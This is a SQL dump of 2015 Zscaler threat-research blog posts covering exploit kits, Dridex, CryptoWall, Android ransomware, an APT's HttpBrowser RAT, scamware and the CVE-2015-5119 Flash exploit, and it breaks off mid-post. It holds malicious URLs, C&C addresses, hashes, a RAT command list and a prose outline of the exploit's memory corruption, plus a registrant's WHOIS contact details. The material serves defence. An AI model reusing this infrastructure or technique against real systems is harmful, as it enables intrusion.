\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Troldesh bundles a Tor proxy to protect its communication\r\n		\r\n	\r\n\r\n\r\n \r\nAlthough they might prefer to infect the machines of non-analysts, the Troldesh author does take the opportunity to greet their reverse engineer friends. This message is less aggressive than the greeting in the Nuclear flash payload.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Thanks, but I don\'t drink coffee!\r\n		\r\n	\r\n\r\n \r\n\r\nConclusion\r\nWhile Nuclear may not be the exploit kit that regularly debuts the latest advances, the authors certainly make an effort to keep up with new exploits and new obfuscation techniques. ThreatLabZ will continue to monitor Nuclear (and Fareit and Troldesh) for any new developments or greetings.\r\n\r\n\r\n \r\nAppendix:\r\n\r\nIndicators:\r\n \r\n\r\n\r\n	Recent landing page IP addresses\r\n	Recent landing page hostnames\r\n	Recent compromised sites and redirectors', 'Exploit Kit;Malware;Ransomware;Vulnerability', 'https://www.zscaler.com/blogs/research/update-nuclear-reverse-engineering');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (127, 'More Adult Themed Android Ransomware', 'Shivang Desai', 'September 03, 2015', 'During the course of our daily malware hunt, we came across a new mobile ransomware variant that leverages pornography to lure victims into downloading and installing it. We\'d previously blogged about similar Android malware.    App Name: Adult Player  URL: hxxp://accanalasti247[.]topliberatone[.]pw/video_player.php?s=Zomhj9PlVZc=&name=Mp4TubePlayer_v5.562.apk&type=1&tpl=1&l=EN  MD5: 6ed2451d1300ff75e793744bb3563638  Package Name: content.mercenary.chiffon    Overview:  This ransomware acts as a porn app named \"Adult Player\" and lures victims who assume it is a pornographic video player. When the victim starts using it, the app silently takes a photo of the victim, which is then displayed on the ransomware screen, along with the ransom message. The app demands a ransom of 500 USD.       	  		  			  		  		  			Icon  		  	    Admin Activation:  Upon opening the app, it asks for admin rights as shown below :    	  		  			  		  		  			Admin privilege  		  	    After clicking \"Activate\", the app shows a fake update page but nothing really happens in terms of an update.       	  		  			  		  		  			Fake update page  		  	           The malware then loads another APK named test.apk from it\'s local storage using a technique referred to as a reflection attack - /data/data/content.mercenary.chiffon/app_dex/test.apk.         Reflection is the ability of a program to examine and modify the behavior of an object at run time, instead of compile time.           	  		  			  		  		  			APK stored in app\'s local storage  		  	    The specific reason for using reflection remains unknown but one reason could be to evade static analysis and detection.           	  		  			  		  		  			Loading Test.apk  		  	      Personalized Ransom Screen:  The ransomware checks whether front camera is available or not. If available, it clicks photo of the victim while he/she is using the app and displays the image on ransom page.       	  		  			  		  		  			Camera check  		  	    The majority of the malicious activities are then conducted by the newly loaded test.apk. The malware connects to the following hard-coded domains contained in the app:      	hxxp://directavsecurity[.]com  	hxxp://avsecurityorbit[.]com  	hxxp://protectforavno[.]net  	hxxp://trustedsecurityav[.]net        	  		  			  		  		  			Hard-coded Domains  		  	      The malware then sends following details that includes victim\'s mobile device and operating system information to the remote server:      	  		  			  		  		  			Data sent in requests  		  	        Ultimately, the malware receives a custom ransom page upon run time in a multi-encoded response from the aforementioned servers.         	  		  			  		  		  			Decoded Ransom Message  		  	    Once the response is received, the ransomware locks the phone and displays the following ransom screen.      	  		  			  		  		  			Ransom Page 1 (User Image Displayed Here)  		  	           	  		  			  		  		  			Ransom Page 2  		  	         The ransom screen is designed to stay persistent even at reboot. It does not allow the user to operate the device and keeps the screen active with ransom message.    	  		  			  			  		  		  			Broadcast Receiver acting on particular events  		  	        	  		  			  			  		  		  			Preventing device from sleeping  		  	      More variants:  We also encountered additional apps belonging to this ransomware family and exhibiting similar functionality.    Sample MD5s:       	ecd8c9eeae86c0d7d3c433e887fd5d3a  	b544785176ed8152671bac94a18ca9d0  	9c731690985ce7c13ca9b25b9139d6a3        Mitigation:  The ransomware is designed to stay stagnant on screen and does not allow the the victim to uninstall it. Rebooting the device does not work in such cases as ransomware app becomes active immediately after reboot, which leaves no scope for the victim to get into device \"settings\" and uninstall the ransomware.    In such scenarios, it can be removed by using the following steps:       	Boot device into safe mode (Please note that entering \"safe mode\" varies depending on your device). Safe mode boots the device with default settings without running third party apps.  	Uninstalling ransomware from device requires you to first remove administrator privilege. To do the same, go to Settings --> Security --> Device Administrator and select ransomware app, then deactivate.  	Once this is done, you can go to Settings --> Apps --> Uninstall ransomware app.      Prevention:  To avoid being victim of such ransomware, it is always best to download apps only from trusted app stores, such as Google Play. This can be enforced by unchecking the option of \"Unknown Sources\" under the \"Security\" settings of your device.', 'Analysis;Mobile', 'https://www.zscaler.com/blogs/research/more-adult-themed-android-ransomware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (128, 'Signed Dridex Campaign', 'Tarun Dewan', 'August 24, 2015', 'Introduction\r\nMalware authors use various means to make their malware look similar to legitimate software. One such approach involves signing a malware sample with a digital certificate. Recently we saw Dridex malware authors using this technique while reviewing the samples in our Cloud Sandbox. Dridex is a banking Trojan which typically arrives to a system via malicious spam email with a Microsoft Office file as an attachment. These files will have embedded macros that lead to the download and installation of the Dridex Trojan. Dridex then attempts to steal the victim\'s banking credentials and system information.\r\n \r\n\r\nSigned Dridex campaign\r\nHere we came across one malicious attachment with an encrypted macro that downloads signed Dridex samples from 81.17.28.101/bt/bt/sti[.]php. This Dridex sample is packed using a custom packer, which is is compiled with .NET. The current Dridex is signed with a certificate that is issued to Private Person Parobii Yuri Romanovich. This certificate as been specially created for spreading the Dridex malware.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Certificate\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\nWe also saw the following signer information in the certificates used for signing the Dridex executables:\r\n\r\n\r\n	PJSC \"BIZNES AVTOMATYKA\r\n	AVTOZVIT Scientific Production Private Company\r\n	Private Person Parobii Yuri Romanovich\r\n\r\nThe certificates were all issued by COMODO and we observed the following URLs serving the signed Dridex malware:\r\n\r\n\r\n	185.14.29.214/bt/bt/sdp [.] php\r\n	81.17.28.101/bt/bt/sti [.] php\r\n	5.196.241.204/bt/bt/ched [.] php\r\n	 217.12.203.171/bt/bt/freda [.] php\r\n	94.250.252.13/bt/bt/stata [.] php\r\n	149.202.146.176/bt/bt/chdid [.] php\r\n	93.170.105.60/bt/bt/grtes [.] php\r\n\r\nBelow are the Dridex samples served from the aformentioned URLs. All tof he samples are packed with the same .NET packer mentioned above:\r\n\r\n\r\n	5CA1DBA1C72AC999E221DE98BBC584C4\r\n	9E73E0C4B92253C5F8B6648F29B28B5B\r\n	CD243B30B9BBD682C082CFEFDBF79ACD\r\n	E578618F2D38FC251D52D1366144404F\r\n	5F907702CE229937955B4DCE92EC4575\r\n	DC443FBB5FB6125EBEEEBEC2E4BAA372\r\n	0BBC8CD08E9958ACDE0519A2B2840CD7\r\n	9D1D0632329F04D8B1EC21AFF4CE6493\r\n	32230D747829DCF77841F594AA54915A\r\n	8F1A9A9830FF02C5C2BA4C17DFE8B09D\r\n	00DCA835BB93708797A053A3B540DB16\r\n	393E2145F4C3E9B5697A2AAEB25AA8D3\r\n	1992170FDC642D4A99A7BC82BA82FA31\r\n	9261B8EAF1DA3D9CFF522875A7198667\r\n	FB67C85F3F42D3E48B9E7B7637D30858\r\n	E578618F2D38FC251D52D1366144404F\r\n\r\nDridex Packer:\r\nThe Dridex sample is embedded in the resource section of the packer. After unpacking, it drops a Borland Delphi executable file. The following is the snapshot of encrypted resource section:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Encrypted Resource Section\r\n		\r\n	\r\n\r\nDridex Activity:\r\nThe current Dridex sample tries to connect to different IPs included in the config file. The config file for the sample is embedded in the sample itself. In the config file we observed a botnet ID and list of  C&C servers. Below is a snapshot of config file:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Configuration file\r\n			 \r\n		\r\n	\r\n\r\nDridex collects and sends the following system information to one of the C&C mentioned in the config file:\r\n\r\n\r\n	Computer Name\r\n	User Name\r\n	Windows Version\r\n	Botnet ID\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Information sent to the server\r\n		\r\n	\r\n\r\nBelow is the complete list of C&Cs it tries to connect.\r\n\r\n\r\n	80.247.233.18\r\n	91.121.82.113\r\n	69.164.213.85\r\n	79.143.191.147\r\n	199.241.30.233\r\n	162.243.12.14\r\n	188.93.73.90\r\n	 195.154.184.240\r\n\r\n\r\nConclusion\r\n\r\nThe use of a legitimate certificate in signing malware executables to evade security detection is not new but is still very effective. The malware author aims to exploit the Code-Signing Certificate based whitelisting approach by signing their samples. Zscaler ThreatlabZ is actively monitoring these signed malware campaigns and ensuring coverage for our customers.\r\n\r\n \r\nAnalysis by Tarun Dewan and Nirmal Singh', 'Malware', 'https://www.zscaler.com/blogs/research/signed-dridex-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (129, 'Neutrino Campaign Leveraging WordPress, Flash For CryptoWall', 'ThreatLabz', 'August 20, 2015', 'Overview  Neutrino Exploit Kit (EK) appeared on the scene around March of 2013 and continues to remain active and incorporate new exploits. In the beginning of July, Neutrino reportedly incorporated the HackingTeam 0day (CVE-2015-5119), and in the past few days we\'ve seen a massive uptick in the use of the kit. The cause for this uptick appears due to widespread WordPress site compromises.    ThreatLabZ started seeing a new campaign where WordPress sites running version 4.2 and lower were compromised, and the image below illustrates the components involved in this campaign.       	  		  			  		  		  			Fig 1. Complete Neutrino WordPress campaign  		  	      In analyzing the infection cycle, there are multiple recent changes in the Neutrino code, some that are normally characteristics of Angler Exploit Kit, but others that remain unique to Neutrino.  WordPress Compromises  Similar to Angler Exploit Kit, the new wave of Neutrino is targeting outdated versions of WordPress. In fact, we have seen over 2600 unique WordPress sites being used in this campaign where more than 4200 distinct pages have been logged with dynamic iframe injection in the last month. As mentioned, all the targeted websites were running WordPress version 4.2 and lower.       	  		  			  		  		  			Fig 2. Event timeline overview  		  	      The goal of this campaign is to completely and fully compromise the site, which includes adding a webshell, harvesting credentials, and finally injecting an iframe that loads a Neutrino landing page. The iframe is injected into the compromised site immediately after the BODY tag, and is almost identical to recent Angler samples. Compare these recent Neutrino and Angler samples below.       	  		  			  		  		  			Fig 3. Neutrino on the left, Angler on the right  		  	      The code specifically targets Internet Explorer, so those using other browsers won\'t be served the iframe, and a cookie is used to prevent serving the iframe multiple times to the same victim.    The actual Neutrino landing pages are retrieved on the backend through the injected php code, a sample of which is below:       	  		  			  		  		  			Fig 4. Injected php code  		  	      Note the base64 encoded value boxed in red above; this decodes to the URL below, where X, Y, and Z are integers:  http://93.171.205.64/blog/?bf4z&utm_source=XXXXX:YYYYYY:ZZZ  This URL is used to retrieve an updated landing page URL, and we\'ve noted that the URLs change very frequently. Additionally, the primary IP hosting the majority of landing page domains is \'185.44.105.7\' which is owned by VPS2DAY.com. We reached out to them via email briefly explaining what we were seeing and received no response.    Neutrino Landing Page  The landing page has been updated and contains some JavaScript that only declares variables, and then a flash loader:       	  		  			  		  		  			Fig 5. Neutrino landing page  		  	      If flash isn\'t installed on the victim machine, an old flash cab is pushed to the user prior to serving the malicious SWF. Note the departure from using base64 encoded data blobs, or really using very much code at all on the landing page.     Neutrino SWF  Past versions of the Neutrino SWF contained multiple exploit payloads encrypted via RC4. Examining this SWF shows that things have apparently changed as the structure is very different:       	  		  			  		  		  			Fig 6. SWF structure  		  	      Taking a look at the code shows that instead of RC4, there is a decode function that uses the input of one binary data blob to decode a second binary blob; the decoded data reveals a second SWF:       	  		  			  		  		  			Fig 7. Decode function for embedded SWF  		  	      Detection results for the SWF are very poor with only one vendor detecting it:       	  		  			  		  		  			Fig 8. Poor detection results on SWF  		  	      Carving out the embedded SWF and analyzing it shows a much more familiar structure for Neutrino, with some additional enhancements. Notably similar is the use of multiple embedded binary blobs that are RC4 encrypted:       	  		  			  		  		  			Fig 9. Binary data inside embedded SWF  		  	           	  		  			  		  		  			Fig 10. Script data inside embedded SWF - characteristic of Neutrino  		  	      These binary blobs contain multiple payloads, and this has been analyzed and documented in the past, notably by Kafeine and Dennis O\'Brien on Malwageddon. However, unlike past Neutrino SWFs, the RC4 keys are no longer in cleartext and decoding them requires tracing through multiple function calls. The ActionScript structure is still very recognizable though:       	  		  			  		  		  			Fig 11. Decoder for one binarydata \'exploitWrapper\' blob  		  	    Detection on the embedded SWF is also quite poor.      	  		  			  		  		  			Fig 12. Embedded SWF VT detection  		  	         Payload  Successful exploitation of a victim leads to an encrypted executable download. The binary is decrypted and begins beaconing almost immediately:       	  		  			  		  		  			Fig 13. Initial beacon summary  		  	        	  		  			  		  		  			Fig 14. Full beacon/response sample  		  	            Looking at the traffic, we can immediately see this is CryptoWall 3.0. Sure enough, a couple minutes later we see the all too familiar \'HELP_DECRYPT\' page and see connections out to the payment servers:       	  		  			  		  		  			Fig 15. Payment server connections  		  	           	  		  			  		  		  			Fig 16. CryptoWall 3.0 HELP_DECRYPT page  		  	      To read more about CryptoWall, please see our previous writeup here.     Campaign Information  As stated, the primary IP for the observed Neutrino landing pages is \'185.44.105.7\' which is owned by VPS2DAY.com. Many of the domains pointing to that IP utilize \'xyz\', \'ga\', \'gq\', and \'ml\' TLDs. Taking a look at the whois data for some of these domains, a common attribute seems to be the name \'Max Vlapet\' for .XYZ domains. Full whois domain sample for completeness:    WHOIS MOHGROUP.XYZ    Domain Name: MOHGROUP.XYZ   Domain ID: D9543161-CNIC   WHOIS Server: whois.alpnames.com   Referral URL:   Updated Date: 2015-08-18T08:34:04.0Z   Creation Date: 2015-08-18T08:34:03.0Z   Registry Expiry Date: 2016-08-18T23:59:59.0Z   Sponsoring Registrar: AlpNames Limited   Sponsoring Registrar IANA ID: 1857   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited   Domain Status: addPeriod https://icann.org/epp#addPeriod   Registrant ID: ALP_44867689   Registrant Name: Max Vlapet   Registrant Organization: N/A   Registrant Street: Mausoleum str, pl.13   Registrant City: Moscow   Registrant State/Province: Moscow   Registrant Postal Code: 123006   Registrant Country: RU   Registrant Phone: +7.4959826524   Registrant Phone Ext:   Registrant Fax:   Registrant Fax Ext:   Registrant Email: maxvlapet@gmail.com   Admin ID: ALP_44867689   Admin Name: Max Vlapet   Admin Organization: N/A   Admin Street: Mausoleum str, pl.13   Admin City: Moscow   Admin State/Province: Moscow   Admin Postal Code: 123006   Admin Country: RU   Admin Phone: +7.4959826524   Admin Phone Ext:   Admin Fax:   Admin Fax Ext:   Admin Email: maxvlapet@gmail.com   Tech ID: ALP_44867689   Tech Name: Max Vlapet   Tech Organization: N/A   Tech Street: Mausoleum str, pl.13   Tech City: Moscow   Tech State/Province: Moscow   Tech Postal Code: 123006   Tech Country: RU   Tech Phone: +7.4959826524   Tech Phone Ext:   Tech Fax:   Tech Fax Ext:   Tech Email: maxvlapet@gmail.com   Name Server: NS2.MOHGROUP.XYZ   Name Server: NS1.MOHGROUP.XYZ   DNSSEC: unsigned   Billing ID: ALP_44867689   Billing Name: Max Vlapet   Billing Organization: N/A   Billing Street: Mausoleum str, pl.13   Billing City: Moscow   Billing State/Province: Moscow   Billing Postal Code: 123006   Billing Country: RU   Billing Phone: +7.4959826524   Billing Phone Ext:   Billing Fax:   Billing Fax Ext:   Billing Email: maxvlapet@gmail.com   >>> Last update of WHOIS database: 2015-08-19T00:44:12.0Z <<<     Unfortunately, very little information is available for the other TLDs in use. The backend IP serving new landing page URLs is registered to a company called \'VDS INSIDE\' located in Ukraine.    A dump of the 700+ malicious domains and/or landing pages we\'ve collected is on pastebin: http://pastebin.com/946rPaGx    Conclusion  WordPress, being a widely popular and free Content Management System (CMS), remains one of the most attractive targets for cyber criminals.  WordPress compromises are not new, but this campaign shows an interesting underground nexus starting with backdoored WordPress sites, a Neutrino Exploit Kit-controlled server, and the highly effective CryptoWall ransomware. This campaign also reconfirms that Neutrino Exploit Kit activity is on the rise and is still a major player in the exploit kit arena.    ThreatLabZ is actively monitoring this campaign and ensuring that Zscaler customers are protected.     Acknowledgement  Special thanks to Dhruval Gandhi for profiling compromised WordPress sites    Write-up by: John Mancuso, Deepen Desai', 'Adobe;Exploit;Exploit Kit;Ransomware;Vulnerability', 'https://www.zscaler.com/blogs/research/neutrino-campaign-leveraging-wordpress-flash-cryptowall');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (130, 'Chinese Cyber Espionage APT Group ‘Emissary Panda’ Activity Update', 'Deepen Desai', 'August 20, 2015', 'Introduction\r\nLast week we shared research on the Chinese cyber espionage APT group ‘Emissary Panda’ and how the group is for the first time leveraging Hacking Team’s leaked exploits to target a multinational financial services firm. Upon further analysis we have identified multiple other industry verticals that were also targeted by this group in the last month. The ‘Emissary Panda’ APT group has been known to target the government and technology sectors with the intent to monitor and steal intellectual property data.\r\n\r\nThere were multiple global clients targeted in the last month that belong to following industry verticals:\r\n\r\n	Financial Services\r\n	Energy\r\n	Pharmaceutical\r\n\r\n\r\nAttack Chain\r\n\r\n\r\nAs noted before, this was the first instance of the ‘Emissary Panda’ group weaponizing malware payloads using the 0-day exploits found in the leaked Hacking Team archives. We were able to confirm usage of Adobe Flash exploits CVE-2015-5119 and CVE-2015-5123 in these attacks.\r\n\r\n \r\n\r\nIn the attack against a Pharmaceutical firm, we observed the use of a compromised Government site to redirect the victim to a server hosting the Hacking Team’s 0-day Flash exploit. This technique is known as Strategic Web Compromise (SWC) or a Watering Hole attack, wherein a legitimate trusted website known to be visited by the target group is compromised in order to redirect them to the attacker controlled server. The attacker controlled server will serve and execute browser based exploits to install a RAT on the target machine.\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			APT Attack chain targeting a multinational Pharmaceutical company\r\n		\r\n	\r\n\r\n\r\nIn this attack, we were able to prevent the download and installation of the RAT payload.\r\n\r\n \r\n\r\nIn another instance, spearphishing e-mail was used to target an organization in energy sector that resulted in installation of HttpBrowser RAT. The attacks against these organizations were largely unsuccessful as the Zscaler security platform blocked either the exploitation attempt or the Command & Control communication attempt.\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Emissary Panda APT attacks seen in last month\r\n		\r\n	\r\n\r\nWe are still investigating some of these attack chains and will share additional details when they become available.\r\n\r\n \r\nConclusion\r\nIt is alarming to see an uptick in the activity from this group targeting multiple verticals with organizations located in United States, Europe, Middle East, and Asia. In order to protect themselves, it is extremely important for organizations to have SSL security inspection enabled as well as a Sandbox environment to detonate and block the 0-day exploits involved in such targeted attacks.', 'APT;Malware', 'https://www.zscaler.com/blogs/research/chinese-cyber-espionage-apt-group-emissary-panda-activity-update');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (131, 'Chinese Cyber Espionage APT Group Leveraging Recently Leaked Hacking Team Exploits To Target A Financial Services Firm', 'Deepen Desai', 'August 14, 2015', 'Introduction    As predicted following the leak of Hacking Team exploit codes covered here, the Zscaler security research team has recently started seeing a Chinese cyber espionage group weaponizing malware payloads using the 0-day exploits found in the leaked Hacking Team archives. As such, this new attack represents a dangerous new hybrid combining the work of a notorious cyber criminal gang with Chinese cyber espionage group to attack a financial services firm.          Zscaler\'s cloud sandboxes recently detected a Remote Access Trojan (RAT) being delivered by a well-known Chinese cyber espionage group using the Hacking Team’s 0-day exploits. This attack was specifically targeting a well-known financial services firm. The exploit files involved were identical to the Hacking Team\'s leaked exploit HTML, JavaScript, and ShockWave Flash 0-day files. The end payload that was installed is the HttpBrowser RAT, known to be used by the Chinese group in previous targeted attacks against governments.           	  		  			  		  		  			Figure 1: Chinese APT attack cycle to plant HttpBrowser RAT  		  	           Hacking Team Exploits    The attack involved targeted users visiting a malicious URL delivered via a spear phishing attack. The malicious URL points to a remote server located in Hong Kong (IP Address - 210.209.89.162) that downloads and executes a malicious ShockWave Flash payload through a specially crafted HTML & JavaScript. The exploit files involved are identical to the ones that we found during our analysis of the Hacking Team leaked code as seen below:           	  		  			  		  		  			Figure 2: Resemblance with Hacking Team\'s exploit HTML  		  	           	  		  			  		  		  			Figure 3: Resemblance with Hacking Team\'s SWF exploit  		  	      The Adobe ShockWave exploit (CVE-2015-5119) if successful will download and install a variant of the HttpBrowser RAT from the same Hong Kong based server which eventually also serves as the Command & Control (C&C) server.           	  		  			  		  		  			Figure 4: Hong Kong based server used in the attack [credit: domaintools.com]  		  	      Malware Payload - HttpBrowser RAT    HttpBrowser is a RAT that has become extremely popular in past two years among the APT adversaries, leveraged in various targeted attacks. The RAT has been leveraged as the primary payload by the APT group that is also known to install the nasty Backdoor PlugX RAT during lateral movement in the victim environment after compromise.         The HttpBrowser payload used for the attack was compiled just few days before the attack as seen below:      	  		  			  		  		  			Figure 5: HttpBrowser payload compilation time  		  	      The HttpBrowser installer archive structure is very similar to that observed in previous PlugX attacks. The installer archive in our case was svchost.exe (saved as xox.exe) that consisted of the following three files:             	VPDN_LU.exe - A legitimate digitally signed Symantec Antivirus executable to evade detection        	  		  			  		  		  			Figure 6: Legitimate Symantec Antivirus executable used in the attack   		  	        	navlu.dll - A fake Symantec DLL to decrypt and run the HttpBrowser RAT  	navlu.dll.url - Encrypted HttpBrowser RAT payload        The HttpBrowser RAT installer is responsible for dropping the above three files and running the legitimate Symantec Antivirus binary VPDN_LU.exe. The legitimate binary contains the navlu.dll in the import table ensuring that the DLL will be loaded before it runs. The navlu.dll that gets loaded in this case will be the fake Symantec DLL file present in the same directory and it will patch the entry point of the main executable file with a jump instruction to run the DLL’s code instead.            	  		  			  		  		  			Figure 7: Legitimate executable entry point patched  		  	    This technique is also known as DLL Hijacking which ensures that the fake Symantec DLL gets loaded by abusing the Windows DLL load order. The DLL’s code is responsible for decrypting and running the HttpBrowser RAT payload from the navlu.dll.url file in the same memory space of the benign executable. The decryption routine consist of an incremental XOR as seen below:           	  		  			  		  		  			Figure 8: Incremental XOR routine to decrypt RAT payload  		  	      The HttpBrowser installer structure ensures that the malware evades detection by running in the context of the legitimate signed binary. This also ensures that the malicious DLL will not run by itself in automated analysis environments.         The malware then deletes the original installer file and moves the dropped files to the following location:        	%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe  	%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\navlu.dll  	%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\navlu.dll.dll        The malware also creates the following registry entry to ensure persistence:        	HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn “%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe”        Command & Control communication    The HttpBrowser RAT variant was configured to connect to the following Command & Control server upon successful infection:        	update.hancominc[.]com:8080        It relays the following information of the victim machine in an encrypted format over SSL:    /loop?c=<computerName & userName>&l=<IP Address>&o=<Operating System details>&u=<GUID>&r=<Injection Status (Boolean)>&t=<Running Time>    The commands supported by this RAT variant are:             	  		  			  			Command  			  			  			Description  			  		  		  			  			init  			  			  			start reverse shell and send list of drives on infected system.  			  		  		  			  			setcmd  			  			  			change the default (cmd.exe) shell  			  		  		  			  			settime  			  			  			Set sleep time  			  		  		  			  			uninstall  			  			  			uninstall itself  			  		  		  			  			write  			  			  			write command to shell  			  		  		  			  			list  			  			  			Send list of files and folders to C&C  			  		  		  			  			upload  			  			  			Download file from C&C  			  		  		  			  			down  			  			  			Upload file to C&C  			  		  	                                                                                             Here are some sample decrypted C&C transactions from the HttpBrowser RAT:           	  		  			  		  		  			Figure 9: List of drives sent as part of the init command  		  	           	  		  			  		  		  			Figure 10: List of files sent as part of the list command  		  	        Conclusion    HttpBrowser RAT, due to the range of features including SSL based C&C channel, anti-detection & anti-analysis techniques, remains the popular malware of choice for APT attacks. There have been multiple instances where this RAT co-existed with PlugX RAT on the compromised network indicating an APT adversary group with a set attack tool arsenal. The network infrastructure leveraged in this attack against the financial services firm shows involvement of a previously known Cyber espionage APT group of Chinese origin. The main motive of this group is to monitor and exfiltrate intellectual property data from the target organization.         Zscaler’s ThreatLabZ has confirmed coverage for these exploits and for the HttpBrowser variant, ensuring protection for organizations using Zscaler’s Internet security platform.        Research by: Abhay Yadav, Avinash Kumar, Nirmal Singh, Deepen Desai', 'APT;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/chinese-cyber-espionage-apt-group-leveraging-recently-leaked-hacking-team-exploits-target-financial-services-firm');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (132, 'Anatomy Of A Scamware Network - MultiPlug', 'Ed Miles', 'July 29, 2015', 'While examining our cloud sandbox data recently, we uncovered a large MultiPlug network that caught our attention due to its use pattern of code signing certificates and the breadth of its hosting infrastructure.         	  		  			  		  		  			Overview of the Scamware Hosting Network (Node Legend -- Red: Host, Pink: Domain, Green: File-MD5)  		  	           As we discussed in June, MultiPlug is a common scamware family that tricks users into downloading/installing an initial binary, which then delivers a variety of additional spyware packages. Search poisoning is used to bait users into installing the scamware, with the lures including cracked and legitimate software, pirated music and movies, as well as other documents and files that a user might be seeking.           	  		  			  		  		  			This installer pretends to help speed up your downloads  		  	           After taking the bait and executing the file, the user is presented with one of several typical-looking installer dialogs that promise to deliver what the user was originally searching for. Whether the user realizes the mistake or not, the “installer” will proceed to fetch multiple encrypted payloads from a remote webserver. The installation of the payloads continues even if the user clicks the various “Decline”, “Cancel”, or “Exit” buttons. Throughout the process, the scamware also gathers system information and sends it to remote webservers.           	  		  			  		  		  			Data sent to remote servers via HTTP POST  		  	           Several typical components of the scamware include a payload called ‘compfix’ that is installed as a system service to be run at boot time, as well as a payload called ‘SystemStrengthener’.           	  		  			  		  		  			\'compfix\' installed as a service  		  	              Besides the benevolent sounding payloads mentioned above, the scamware makes a few changes to the user’s Browser configuration. If Chrome is installed, two DLLs are dropped into the Chrome installation directory that appear to be modified and slightly outdated versions of ‘chrome.dll’. Chrome and Internet Explorer also receive browser extensions that spy on user behavior and serve ads. As a bonus, the IE add-ons are marked as uninstallable without Administrator approval.         	  		  			  		  		  			Modified Chrome DLLs with invalid certs  		  	             	  		  			  		  		  			User is prevented from disabling scamware addons  		  	             	  		  			  		  		  			User is prevented from disabling scamware addons  		  	             	  		  			  		  		  			New Chrome addons installed without notice  		  	         Apart from some additional obfuscation layers compared to previous versions, the technical aspects of this malware are fairly standard. However, the breadth of the hosting network and the pattern of code signing certificates used, made this an interesting campaign. We uncovered 33 unique certificates, all issued from the same Certificate Authority: Certum / Unizeto Technologies. (Note: we also identified other adware campaigns utilizing Certum certificates, though they appeared to be unrelated.)             	  		  			  		  		  			Unizeto Technologies / CERTUM issued certificates (Node Legend -- Yellow: Issuer, Blue: Signer)  		  	             These 33 certificates were used to sign 2,783 pieces of scamware that were hosted on 447 unique hosts (323 unique domains). While it\'s normal for adware campaigns that utilize code signing to rotate through their certificates as they are blocked by AV and security companies, the volume of unique signing certificates in use signals that something is different here. Additionally, the data in the signatures indicates that all of the certificates are owned by individual persons with free email accounts. This hinders naive blacklisting as well as attribution, since there is no clear way to link the campaign to a specific organization.        	  		  			  			  			  		  		  			Overview of the Scamware Network (Node Legend -- Yellow: Issuer, Blue: Signer, Red: Host, Pink: Domain, Green: File-MD5)  		  	      Given the nature of this MultiPlug campaign, it is easy to hypothesize that the organization behind it has more evil-intent than the usual adware/scamware operators. That said, it could just be a matter of the organization trying to maximize their ROI for this large infrastructure they operate. Regardless of their intentions, enterprises should be wary of even the most innocuous looking adware due to the ability to perform system and network reconnaissance, achieve persistence on infected hosts, deliver arbitrary payloads, and take control of the system, its applications, and its data.', 'Malware', 'https://www.zscaler.com/blogs/research/anatomy-scamware-network-multiplug');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (133, 'Adobe Flash Vulnerability CVE-2015-5119 Analysis', 'Rubin Azad', 'July 13, 2015', 'With the leak of Hacking Team\'s data, the security industry came to learn about multiple new 0day vulnerabilities targeting Flash, Internet Explorer, Android, etc. As always, exploit kit authors were quick to incorporate these 0day exploits into their arsenal.    In this blog, we will be looking at the CVE-2015-5119 exploit payload that we have now seen in the wild. The sample has multiple layers of obfuscation and packer routines. The malicious Flash payload is packed, XOR\'ed and stored as a binary data inside a parent Flash file that dynamically unpacks a malicious Flash file and writes it to memory at run time.       Here is the structure of the CVE-2015-5119 exploit payload:                  Packages, properties and method names are stored in variables for obfuscation:                    Here we observe the calling of the unpack routine to decrypt the embedded SWF exploit payload:                  An XOR key is used for unpacking and is hardcoded and assigned to the variable vari_10. This is what the unpacked content looks like:                       Upon decompilation, it is apparent that majority of the codebase, including variable names and function names are the same as what we saw in the leaked source by the Hacking Team. The public exploit also has checks for:           	Presence of a debugger  	Operating System bitness (32-bit or 64-bit)                    When the program execution starts, the ActionScript looks for the input parameters and based on it, sets a variable which is then sent to the main exploitation routine as seen below:                    The TryExpl() routine allocates sequential pages of memory and begins the exploit cycle:                       The vulnerability lies in making use of the valueOf property and corrupting the vector space so that the valueOf  property will overwrite the length field of the vector object, which will be further used to get access to vtables.         Here is explicit definition of valueOf function                  prototype.valueOf() is setting up the length of the ByteArray to 4352         Once the memory allocation is done, a MyClass object is created and assigned to _ba[3]. The    valueOf()  function defines the length of ByteArray to 4352, which is greater than the length of the object created, causing reallocation of bytes inside the memory.                       If the value of _ba[3] is set to zero after the assignment then it was successful in triggering a Use After Free vulnerability. The exploit code looks for the kernel32.VirtualProtect() (VP) function in the corrupted vector space as seen below:                  A call to the VP function is made, which replaces the vtable pointer and sets the PAGE_EXECUTE_READWRITE permission before executing the final payload.                           Hashes of  CVE-2015-5119 exploit payloads seen in 